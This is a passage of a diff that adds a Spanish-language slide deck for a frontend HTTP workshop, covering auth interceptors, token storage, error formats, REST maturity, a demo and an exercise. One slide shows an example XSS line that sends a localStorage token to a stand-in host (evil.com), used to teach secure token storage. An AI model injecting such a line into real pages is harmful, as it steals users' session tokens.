+   GET /api/products + Header: Authorization: Bearer nuevo-eyJ...
+   → 200 [products...]
+
+6. (Si refresh también falla)
+   → Logout automático → Redirect a login</code></pre>
+    <p class="small">Todo esto pasa en el interceptor. El componente NO se entera del 401 ni del refresh.</p>
+  </section>
+
+  <!-- 3.8 Dónde guardar tokens -->
+  <section>
+    <h2>⚠️ Dónde guardar tokens</h2>
+    <div class="two-col">
+      <div>
+        <h4 class="highlight-red">❌ localStorage / sessionStorage</h4>
+        <ul class="small">
+          <li>Accesible por CUALQUIER JavaScript en la página</li>
+          <li>Si hay un XSS (script inyectado), el atacante roba el token</li>
+          <li>Persiste entre tabs y recargas (localStorage)</li>
+          <li>No se envía automáticamente al server</li>
+        </ul>
+        <pre><code class="language-javascript">// Un atacante con XSS puede hacer:
+fetch('https://evil.com/steal?token=' +
+  localStorage.getItem('token'));</code></pre>
+      </div>
+      <div>
+        <h4 class="highlight-green">✅ Memoria + httpOnly cookie</h4>
+        <ul class="small">
+          <li><strong>Access token:</strong> en memoria (variable/signal) — se pierde al cerrar tab</li>
+          <li><strong>Refresh token:</strong> en httpOnly cookie — JavaScript NO puede leerlo</li>
+          <li>El browser envía la cookie automáticamente</li>
+          <li>XSS no puede robar lo que no puede leer</li>
+        </ul>
+        <pre><code class="language-typescript">// En Angular con signals:
+private readonly token = signal&lt;string | null&gt;(null);
+// XSS no puede acceder a esto directamente</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- 3.9 RFC 7807 Problem Details -->
+  <section>
+    <h2>RFC 9457 — Problem Details</h2>
+    <h4>El estándar para error responses en APIs</h4>
+    <pre><code class="language-json">// En vez de inventar tu propio formato de error...
+// Usa el estándar:
+{
+  "type": "https://api.myapp.com/errors/validation",
+  "title": "Validation Error",
+  "status": 422,
+  "detail": "The field 'price' must be greater than 0",
+  "instance": "/api/products",
+  "errors": [
+    { "field": "price", "message": "Must be > 0" },
+    { "field": "name", "message": "Required" }
+  ]
+}</code></pre>
+    <ul class="small">
+      <li><strong>type:</strong> URI que identifica el tipo de error (documentación)</li>
+      <li><strong>title:</strong> Resumen legible por humanos</li>
+      <li><strong>status:</strong> HTTP status code (redundante pero útil cuando se loggea solo el body)</li>
+      <li><strong>detail:</strong> Explicación específica de esta instancia del error</li>
+      <li><strong>instance:</strong> URI del recurso que causó el error</li>
+      <li>Puedes agregar campos custom (como <code>errors[]</code> para validación)</li>
+    </ul>
+  </section>
+
+  <!-- 3.10 Richardson Maturity Model -->
+  <section>
+    <h2>Richardson Maturity Model</h2>
+    <h4>¿Qué tan REST es tu API?</h4>
+    <table>
+      <thead><tr><th>Nivel</th><th>Nombre</th><th>Características</th><th>Ejemplo</th></tr></thead>
+      <tbody>
+        <tr><td>0</td><td>The Swamp of POX</td><td>Un endpoint, todo POST, RPC-style</td><td><code>POST /api { action: "getUser", id: 1 }</code></td></tr>
+        <tr><td>1</td><td>Resources</td><td>URLs por recurso, pero solo POST/GET</td><td><code>POST /api/users/1/delete</code></td></tr>
+        <tr><td>2</td><td>HTTP Verbs</td><td>Usa methods correctamente + status codes</td><td><code>DELETE /users/1 → 204</code></td></tr>
+        <tr><td>3</td><td>HATEOAS</td><td>Responses incluyen links a acciones posibles</td><td><code>{ "links": [{ "rel": "cancel", "href": "/orders/1/cancel" }] }</code></td></tr>
+      </tbody>
+    </table>
+    <p class="small">
+      La mayoría de APIs en producción están en <strong>Nivel 2</strong>. Nivel 3 (HATEOAS) es raro en la práctica.
+      Lo importante: si tu API no está al menos en Nivel 2, no es REST — es RPC con URLs bonitas.
+    </p>
+  </section>
+
+</section><!-- Fin Bloque 3 -->
+
+<!-- ======================================================== -->
+<!-- BLOQUE 4: DEMO EN VIVO -->
+<!-- ======================================================== -->
+<section>
+
+  <!-- 4.0 Portada -->
+  <section>
+    <h2>Bloque 4</h2>
+    <h1>🖥️ Demo en Vivo</h1>
+    <p class="subtitle">12 minutos — Angular + DevTools</p>
+    <pre><code class="language-bash">cd demo && npm start
+# json-server en :3000 + Angular en :4200</code></pre>
+  </section>
+
+  <!-- 4.1 Qué vamos a ver -->
+  <section>
+    <h2>Demo — Rutas disponibles</h2>
+    <table>
+      <thead><tr><th>Ruta</th><th>Concepto HTTP</th><th>Qué observar en Network tab</th></tr></thead>
+      <tbody>
+        <tr><td><code>/examples</code></td><td>GET, POST, PUT, PATCH, DELETE</td><td>Methods, body, status codes, idempotencia</td></tr>
+        <tr><td><code>/error-handling</code></td><td>Status codes 4xx y 5xx</td><td>Diferentes responses por código, interceptor en acción</td></tr>
+        <tr><td><code>/cors</code></td><td>CORS y Preflight</td><td>OPTIONS request, error de CORS, headers Allow-*</td></tr>
+        <tr><td><code>/auth-flow</code></td><td>Auth + Refresh + Retry</td><td>Authorization header, 401 → refresh → retry transparente</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 4.2 Puntos clave demo -->
+  <section>
+    <h2>Demo — Puntos clave a mostrar</h2>
+    <ul>
+      <li>🔍 <strong>Network tab abierto SIEMPRE</strong> — filtrar por Fetch/XHR</li>
+      <li>📝 <strong>POST /products</strong> → ver 201 + Location header en response</li>
+      <li>🔄 <strong>PUT x3</strong> → mismo resultado (idempotente) vs <strong>POST x2</strong> → 2 recursos</li>
+      <li>❌ <strong>GET /products/999</strong> → 404 + cómo el componente maneja el error</li>
+      <li>🔒 <strong>CORS</strong> → provocar error, ver OPTIONS preflight, explicar headers</li>
+      <li>🔐 <strong>Auth</strong> → login → ver Bearer en headers → simular refresh</li>
+      <li>📊 <strong>Console</strong> → logging interceptor muestra timing de cada request</li>
+    </ul>
+    <p class="small">
+      Tip: Hacer zoom en DevTools (Cmd/Ctrl + +) para que la audiencia vea los headers.
+    </p>
+  </section>
+
+  <!-- 4.3 Código del interceptor en vivo -->
+  <section>
+    <h2>Demo — Auth Interceptor (código real)</h2>
+    <pre><code class="language-typescript">export const authInterceptor: HttpInterceptorFn = (req, next) => {
+  const authService = inject(AuthService);
+  const token = authService.getToken();
+
+  // No agregar token a endpoints de auth
+  if (!token || req.url.includes('/auth/')) {
+    return next(req);
+  }
+
+  // Clonar request (son INMUTABLES) y agregar header
+  const authReq = req.clone({
+    setHeaders: { Authorization: `Bearer ${token}` }
+  });
+
+  return next(authReq);
+};</code></pre>
+    <p class="small">
+      <strong>Punto clave:</strong> El componente hace <code>this.http.get('/products')</code> sin saber nada de tokens.
+      El interceptor se encarga. Separación de responsabilidades.
+    </p>
+  </section>
+
+</section><!-- Fin Bloque 4 -->
+
+<!-- ======================================================== -->
+<!-- BLOQUE 5: CIERRE -->
+<!-- ======================================================== -->
+<section>
+
+  <!-- 5.0 Portada -->
+  <section>
+    <h2>Bloque 5</h2>
+    <h1>Cierre</h1>
+    <p class="subtitle">8 minutos</p>
+  </section>
+
+  <!-- 5.1 Checklist -->
+  <section>
+    <h2>✅ Checklist del Frontend que entiende HTTP</h2>
+    <ul>
+      <li>✅ Usa el <strong>verbo correcto</strong> (no todo es POST/GET)</li>
+      <li>✅ Maneja <strong>status codes</strong> por rango (no todo es <code>catch → alert</code>)</li>
+      <li>✅ Entiende <strong>CORS</strong> (no googlea "disable CORS chrome")</li>
+      <li>✅ Implementa <strong>retry con backoff</strong> (no spamea el server en 503)</li>
+      <li>✅ Lee <strong>headers de response</strong> (no solo el body)</li>
+      <li>✅ Guarda tokens de forma <strong>segura</strong> (no localStorage)</li>
+      <li>✅ Centraliza lógica HTTP en <strong>interceptors</strong> (DRY)</li>
+      <li>✅ Construye <strong>query params</strong> correctamente (HttpParams/URLSearchParams)</li>
+      <li>✅ Distingue <strong>PUT vs PATCH</strong> (reemplazo completo vs parcial)</li>
+      <li>✅ Entiende <strong>idempotencia</strong> (qué es safe de reintentar)</li>
+    </ul>
+  </section>
+
+  <!-- 5.2 Más allá de REST -->
+  <section>
+    <h2>Más allá de REST</h2>
+    <table>
+      <thead><tr><th>Tecnología</th><th>Cuándo usarla</th><th>Ejemplo</th></tr></thead>
+      <tbody>
+        <tr><td><strong>REST</strong></td><td>CRUD estándar, APIs públicas, mayoría de casos</td><td>E-commerce, blogs, SaaS</td></tr>
+        <tr><td><strong>GraphQL</strong></td><td>Múltiples recursos en 1 request, frontend decide qué datos necesita</td><td>Dashboards complejos, mobile (bandwidth)</td></tr>
+        <tr><td><strong>gRPC</strong></td><td>Comunicación server-to-server, alta performance, streaming</td><td>Microservicios internos</td></tr>
+        <tr><td><strong>WebSockets</strong></td><td>Comunicación bidireccional en tiempo real</td><td>Chat, notificaciones, trading</td></tr>
+        <tr><td><strong>Server-Sent Events</strong></td><td>Server push unidireccional (más simple que WS)</td><td>Feeds, progress bars, logs</td></tr>
+      </tbody>
+    </table>
+    <p class="small">
+      REST sigue siendo el default para el 80% de los casos. Usa las alternativas cuando REST no es suficiente,
+      no porque estén de moda.
+    </p>
+  </section>
+
+  <!-- 5.3 Ejercicio -->
+  <section>
+    <h2>🏋️ Ejercicio para Casa</h2>
+    <h4>Implementar un TaskService + Interceptors (TDD)</h4>
+    <pre><code class="language-bash">cd exercise/starter
+npm install
+npm test    # → Todos los tests FALLAN
+# Tu trabajo: hacer que pasen todos</code></pre>
+    <table>
+      <thead><tr><th>Qué implementar</th><th>Concepto que demuestra</th></tr></thead>
+      <tbody>
+        <tr><td>TaskService (7 métodos)</td><td>CRUD + paginación + filtrado + sorting</td></tr>
+        <tr><td>Auth Interceptor</td><td>Bearer token automático</td></tr>
+        <tr><td>Retry Interceptor</td><td>Exponential backoff en 503</td></tr>
+        <tr><td>Error Interceptor</td><td>401 refresh, 429 rate limit, RFC 7807</td></tr>
+      </tbody>
+    </table>
+    <p class="small">
+      <strong>Criterios:</strong> Tests pasan (40%) · Status codes correctos (20%) · Retry solo idempotentes (15%) · Error handling diferenciado (15%) · Código limpio (10%)
+    </p>
+  </section>
+
+  <!-- 5.4 Recursos -->
+  <section>
+    <h2>📚 Recursos</h2>
+    <div class="two-col">
+      <div>
+        <h4>Documentación</h4>
+        <ul class="small">
+          <li>RFC 9110 — HTTP Semantics</li>
+          <li>RFC 9457 — Problem Details</li>
+          <li>angular.dev/guide/http</li>
+          <li>developer.mozilla.org/HTTP</li>
+        </ul>
+        <h4>Herramientas</h4>
+        <ul class="small">
+          <li>httpie.io — CLI para HTTP</li>
+          <li>mswjs.io — Mock Service Worker</li>
+          <li>hoppscotch.io — Postman open-source</li>
+          <li>json-server — Mock API en 30s</li>
+        </ul>
+      </div>
+      <div>
+        <h4>Libros</h4>
+        <ul class="small">
+          <li>"HTTP: The Definitive Guide" — O'Reilly</li>
+          <li>"RESTful Web APIs" — O'Reilly</li>
+          <li>"Designing Web APIs" — O'Reilly</li>
+        </ul>
+        <h4>APIs para practicar</h4>
+        <ul class="small">
+          <li>jsonplaceholder.typicode.com</li>
+          <li>httpbin.org (echo service)</li>
+          <li>reqres.in (fake auth)</li>
+          <li>pokeapi.co (paginación real)</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- 5.5 Q&A -->
+  <section>
+    <h1>¿Preguntas?</h1>
+    <br>
+    <p class="subtitle">
+      "¿Alguien ha tenido un bug de CORS en producción?<br>Cuéntenme la historia." 😈
+    </p>
+    <br>
+    <p class="small">
+      Repo del workshop: <code>http-frontend-workshop/</code><br>
+      Slides: <code>slides/index.html</code> · Demo: <code>demo/</code> · Ejercicio: <code>exercise/</code>
+    </p>
+  </section>
+
+</section><!-- Fin Bloque 5 -->
+
+</div><!-- .slides -->
+</div><!-- .reveal -->
+
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/notes/notes.js"></script>
+<script>
+  Reveal.initialize({
+    hash: true,
+    slideNumber: 'c/t',
+    plugins: [RevealHighlight, RevealNotes],
+    transition: 'slide',
+    width: 1280,
+    height: 720,
+  });
+</script>
+</body>
+</html>
